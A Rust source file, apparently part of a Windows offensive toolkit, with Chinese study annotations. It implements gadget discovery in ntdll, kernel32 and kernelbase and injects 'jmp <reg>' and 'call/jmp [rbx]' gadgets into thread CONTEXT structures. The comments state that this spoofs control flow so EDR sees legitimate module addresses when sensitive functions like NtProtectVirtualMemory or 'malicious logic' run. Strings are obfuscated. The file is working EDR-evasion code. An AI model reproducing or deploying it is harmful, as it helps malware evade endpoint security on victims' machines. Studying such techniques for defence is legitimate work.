use alloc::vec::Vec;
use alloc::string::String;
use core::ffi::c_void;

use obfstr::obfstring as s;
use anyhow::{Context, Result, bail};
use dinvk::helper::PE;
use dinvk::types::{CONTEXT, IMAGE_RUNTIME_FUNCTION};

use crate::config::Config;
use crate::spoof::Unwind;

/// List of short jump opcode patterns mapped to their corresponding register.
/// 
/// &[(&[u8], Reg)]对数组的引用,该数组的元素类型是(&[u8], Reg).其中第一个元组类型是&[u8](字节 slice),第二个是enum Reg
const JMP_GADGETS: &[(&[u8], Reg)] = &[
    // jmp rdi:跳转到rip存储的地址
    (&[0xFF, 0xE7], Reg::Rdi),
    // jmp r10
    (&[0x41, 0xFF, 0xE2], Reg::R10),
    // jmp r11
    (&[0x41, 0xFF, 0xE3], Reg::R11),
    (&[0x41, 0xFF, 0xE4], Reg::R12),
    (&[0x41, 0xFF, 0xE5], Reg::R13),
    (&[0x41, 0xFF, 0xE6], Reg::R14),
    (&[0x41, 0xFF, 0xE7], Reg::R15),
];

/// Enum representing x86_64 general-purpose registers suitable for indirect jumps.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum Reg {
    Rdi,
    R10,
    R11,
    R12,
    R13,
    R14,
    R15,
}

/// Represents a resolved jump gadget in memory.
/// Contains the absolute address and the register it jumps through.
#[derive(Debug, Clone, Copy)]
pub struct Gadget {
    /// Absolute virtual address of the gadget.
    pub addr: u64,

    /// The register used in the jump instruction.
    pub reg: Reg,
}

impl Gadget {
    /// Searches for usable `jmp <reg>` gadgets in memory based on predefined opcodes.
    pub fn new(cfg: &Config) -> Self {
        let mut gadgets = Vec::new();

        // 三个dll的基址
        let modules = [
            // cfg.modules实际上调用了config.rs中Config的关联函数modules->Moudles 并在该函数内部初始化了三个dll的基址.并从返回的Moudles结构体中找到对应dll的基址
            // as *const u8以1字节为单位读取该指针指向的数据.源作为地址的指针仍然是u64大小的(win64下指针和地址永远64位)
            cfg.modules.ntdll.as_ptr() as *const u8,
            cfg.modules.kernel32.as_ptr() as *const u8,
            cfg.modules.kernelbase.as_ptr() as *const u8,
        ];

        // 遍历三个dll
        for &base in modules.iter() {   
            // 取出.text section 地址.if let{}模式匹配,如果匹配执行{}内部代码
            // range为.text的slice,以字节(u8)为单位
            if let Some(range) = get_text_section(base as *mut c_void) {

                if let Some(gadget) = 
                // base是三个dll的基址,以u8为单位进行读取
                find(base, range).first().copied() {
                    gadgets.push(gadget);
                }
            }
        }

        // Shuffle to reduce pattern predictability.
        shuffle(&mut gadgets);

        if let Some(gadget) = gadgets.first().copied() {
            gadget
        } else {
            // SAFETY: `gadgets` is guaranteed to be non-empty at this point due to prior validation.
            // If this invariant is ever broken, this will invoke undefined behavior
            unsafe { core::hint::unreachable_unchecked() }
        }
    }

    /// Injects this gadget into a given thread CONTEXT.
    ///
    /// Sets the `RIP` to the gadget address and writes the `target` value
    /// into the appropriate general-purpose register for indirect jump.
    /// 
    /// 通过设置rip将cpu引向位于三个dll中的指令,如jmp r10
    /// 
    /// 通过match将将真正的目标target,如NtProtectVirtualMemory地址存入cpu对应的register
    /// 
    /// 当cpu恢复执行,会先跳到self.addr,执行jmp r10.这时cpu会立即再次跳转到真正的恶意逻辑/系统调用中
    /// 
    /// 这时win下,实现ROP链(Return-Oriented Programming)调用的标准用法
    /// 
    /// 这里可用ctx.Rip = target;实现同样功能,但EDR会检查rip是否来自合法\已加载的模块的函数导出表
    fn apply(&self, ctx: &mut CONTEXT, target: u64) {
        // 将找到的Gaddet地址存入当前Context的rip.addr在struct Gadget中
        ctx.Rip = self.addr;

        // 匹配gadget中的register.将要执行的函数
        match self.reg {
            Reg::Rdi => ctx.Rdi = target,
            Reg::R10 => ctx.R10 = target,
            Reg::R11 => ctx.R11 = target,
            Reg::R12 => ctx.R12 = target,
            Reg::R13 => ctx.R13 = target,
            Reg::R14 => ctx.R14 = target,
            Reg::R15 => ctx.R15 = target,
        }
    }
}

/// Scans the provided memory region for `jmp <reg>` instruction patterns.
/// Only one gadget per register is recorded to avoid redundancy.
fn find<B>(base: *const u8, region: &B) -> Vec<Gadget> 
where
    // 允许B大小在编译器未知
    // 带有固定大小长度元数据(PointeeSized)的&[u8]
    B: ?Sized + AsRef<[u8]>,
{
    let mut gadgets = Vec::new();
    // 带有;的这种形式,是数组的初始化语法.表示有7个false的数组.
    let mut seen = [false; JMP_GADGETS.len()];
    for (i, (pattern, reg)) in 
    JMP_GADGETS
    // 将slice转为迭代器 .iter()产生的是引用,即每次循环产生的是指向元组的指针&[(&[u8],Reg)]
    .iter()
    // 给.iter()产生的指针加上一个counter,组成一个新的元组.即(usize, &(&[u8], Reg))
    .enumerate() {
        // seen[i]作为是否找到对应gaddet标志/开关,如果找到末尾会seen[i] = true;
        if seen[i] {
            // 对于找到的gaddet,不再继续执行下面的代码,转而进入下一个循环
            continue;
        }

        // find():Returns the index of the first occurrence of the given needle
        // region是.text的slice
        if let Some(pos) = memchr::memmem::find
        // memchr::memmem::find()函数要求第一个函数是&[u8]类型.而region是一个满足AsRef<[u8]>的类型B,所以这里需要使用as_ref()转为&[u8](即slice,字节切片)
        (region.as_ref(), pattern) {
            // Calculates absolute address based on module base
            gadgets.push(Gadget {
                // 这里as_ptr()作用在slice上:Returns a raw pointer to the slice's buffer.即返回region(.text节区)在内存中的起始指针,就是第一个字节的物理内存地址(*const u8)
                addr: base as u64 + (
                    // .text节在当前内存的起始绝对物理地址
                    region.as_ref().as_ptr() as usize 
                    - 
                    // 模块(如dll)在内存中的基址.
                    base as usize //减去后得到.text节的RVA

                    // pos来自memchr::memmem::find():是pattern在region内部的起始索引位置.即节头到gaddet的距离
                    + pos) as u64,

                // JMP_GADGETS.iter()后reg就是&Reg,是指向Reg枚举的引用
                // *reg就是取值操作.发生了一次物理意义上的按位拷贝（Bitwise Copy）.Reg是一个有Copy trait的枚举
                reg: *reg,
            });

            // Mark as found
            seen[i] = true;
        }
    }

    gadgets
}

/// Scans the unwind info of a PE module to locate gadgets within valid runtime functions.
pub fn scan_runtime<B>(
    module: *mut c_void, 
    pattern: &B, 
    runtime_table: &[IMAGE_RUNTIME_FUNCTION]
) -> Option<(*mut u8, u32)>
where
    B: ?Sized + AsRef<[u8]>,
{
    unsafe {
        let mut gadgets = Vec::new();

        for runtime in runtime_table {
            let start = module as u64 + runtime.BeginAddress as u64;
            let end = module as u64 + runtime.EndAddress as u64;
            let size = end - start;

            let bytes = core::slice::from_raw_parts(start as *const u8, size as usize);
            if let Some(pos) = memchr::memmem::find(bytes, pattern.as_ref()) {
                let addr = (start as *mut u8).add(pos);
                if let Some(size) = uwd::ignoring_set_fpreg(module, runtime) {
                    if size != 0 {
                        gadgets.push((addr, size))
                    }
                }
            }
        }

        if gadgets.is_empty() {
            return None;
        }

        // Shuffle to reduce pattern predictability.
        shuffle(&mut gadgets);

        gadgets.first().copied()
    }
}

/// Extracts the `.text` section from a loaded module using PE header parsing.返回.text内容的slice(即包含.text节起始地址和长度的flat pointer)
/// 
/// 只有.text节中的数据才会被cpu作为指令执行.
pub fn get_text_section(base: *mut c_void) -> Option<&'static [u8]> {

    // base是三个dll基址,用于查找节区信息
    if base.is_null() {
        return None;
    }

    unsafe {
        let pe = PE::parse(base);
        let section = pe.section_by_name(obfstr::obfstr!(".text"))?;

        // section.VirtualAddress该节区的RVA.此时ptr指向内存中.text的第一个字节
        // 在物理层面，所有指针（MemoryAddress）在某一瞬间都只代表内存中一个特定字节（Byte）的物理位置,该位置被视为该数据块的起始/首地址,即首字节(该连续数据块的最低位置/下确界);而数据类型的宽度(如u64,8字节)不改变指针指向起始点的物理本质,仅作为cpu执行指令时读取后续连续字节宽度的参数
        let ptr = base.add(section.VirtualAddress as usize);

        Some(core::slice::from_raw_parts(

        // 根据该函数返回地址-> Option<&'static [u8]>,infer 此处ptr.cast()应转为*const u8
        ptr.cast(), 

        // Misc是union,其中Misc.VirtualSize记录节区被加载到内存后的真实字节跨度,是cpu能看到的指令区域总长度,因为内存对齐的原因,可能比磁盘上的文件大.即该节区的逻辑大小,而非页中对齐后的物理大小
        section.Misc.VirtualSize as usize))
    }
}

/// Extension trait to allow injecting gadgets into a CONTEXT struct dynamically.
pub trait GadgetContext {
    /// Modifies the current CONTEXT instance by injecting a jump gadget.然后将第三个参数target作为地址
    /// 
    /// 第一个参数&mut self;第二个Config,第三个u64
    /// 
    /// 在dll的.text中找到jmp <reg> 的gadget->将context.rip设为gadget的物理地址(这样当cpu恢复执行,第一步跳向的时合法的地址,而不是要调用的敏感的函数地址)->根据gadget将目标函数地址写入对register.
    /// 
    /// 当ntcontinue激活这个context后,cpu执行路径为cpu->ntdll!jmp <reg>->target函数:这样如果EDR在跳转瞬间检查rip,看到的是合法的ntdll指令,比从非导出函数/非法内存直接call敏感函数隐蔽
    fn jmp(&mut self, cfg: &Config, target: u64);
}

impl GadgetContext for CONTEXT {
    fn jmp(&mut self, cfg: &Config, target: u64) {
        let gadget = Gadget::new(cfg);
        gadget.apply(self, target);
    }
}

/// Represents the type of gadget used to spoof control flow transitions.
#[derive(Clone, Copy, Debug, Default)]
pub enum GadgetKind {
    /// `call [rbx]` gadget
    #[default]
    Call,

    /// `jmp [rbx]` gadget
    Jmp,
}

impl GadgetKind {
    /// Scans the specified image base for a supported control-flow gadget.
    pub fn detect(base: *mut c_void) -> Result<Self> {
        let pe = Unwind::new(PE::parse(base));
        let tables = pe
            .entries()
            .context(s!("failed to parse .pdata unwind info"))?;
        
        // 0xFF 0x13 : call rbp
        // 0xFF 0x23 : jmp  rbp
        // 在image_runtime_function异常目录中找到符合要求的gadget
        if scan_runtime(base, &[0xFF, 0x13], tables).is_some() {
            Ok(GadgetKind::Call)
        } else if scan_runtime(base, &[0xFF, 0x23], tables).is_some() {
            Ok(GadgetKind::Jmp)
        } else {
            bail!(s!("no suitable call/jmp [rbx] gadget found in image"));
        }
    }

    /// Resolves the actual memory address of the detected gadget in `kernelbase.dll`.
    pub fn resolve(&self, cfg: &Config) -> Result<(*mut u8, u32)> {
        let pe = Unwind::new(PE::parse(cfg.modules.kernelbase.as_ptr()));
        let tables = pe
            .entries()
            .context(s!("failed to read IMAGE_RUNTIME_FUNCTION entries from .pdata section"))?;

        match self {
            GadgetKind::Call => {
                scan_runtime(cfg.modules.kernelbase.as_ptr(), &[0xFF, 0x13], tables)
                    .context(s!("missing call [rbx] gadget"))
            }
            GadgetKind::Jmp => {
                scan_runtime(cfg.modules.kernelbase.as_ptr(), &[0xFF, 0x23], tables)
                    .context(s!("missing jmp [rbx] gadget"))
            }
        }
    }

    /// Returns the byte sequence representing the gadget's instruction pattern.
    #[inline]
    pub fn bytes(self) -> &'static [u8] {
        match self {
            GadgetKind::Call => &[
                0x48, 0x83, 0x2C, 0x24, 0x02, // sub qword ptr [rsp], 2
                0x48, 0x89, 0xEC,             // mov rsp, rbp
                0xC3,                         // ret
            ],
            GadgetKind::Jmp => &[
                0x48, 0x89, 0xEC, // mov rsp, rbp
                0xC3,             // ret
            ],
        }
    }
}

/// Randomly shuffles the elements of a mutable slice in-place using a pseudo-random
/// number generator seeded by the CPU's timestamp counter (`rdtsc`).
pub fn shuffle<T>(list: &mut [T]) {
    let mut seed = unsafe { core::arch::x86_64::_rdtsc() };
    for i in (1..list.len()).rev() {
        seed = seed.wrapping_mul(1103515245).wrapping_add(12345);
        let j = seed as usize % (i + 1);
        list.swap(i, j);
    }
}